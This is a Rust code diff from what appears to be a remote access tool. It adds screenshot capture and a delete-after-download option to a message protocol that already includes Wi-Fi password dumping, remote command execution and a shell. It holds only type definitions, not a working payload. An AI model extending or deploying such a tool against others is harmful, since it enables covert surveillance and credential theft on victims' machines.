@@ -18,6 +18,7 @@ pub enum ClientMessage {
     // System
     SystemInformation(SystemInformation),
     WifiDump(Vec<WifiPasswords>),
+    Screenshot(String),
 
     // File system
     FileHandler(FileHeader),
@@ -38,16 +39,23 @@ pub enum InstructMessage {
     WifiDump,
     Check,
     Display(Display),
+    Screenshot,
 
     // Shell
     Exec(String),
     Shell,
 
     // FileSystem
-    Download(String),
+    Download(Download),
     Upload,
 
     Close,
+}
+
+#[derive(Serialize, Deserialize)]
+pub struct Download {
+    pub path: String,
+    pub delete: bool
 }
 
 #[derive(Serialize, Deserialize)]
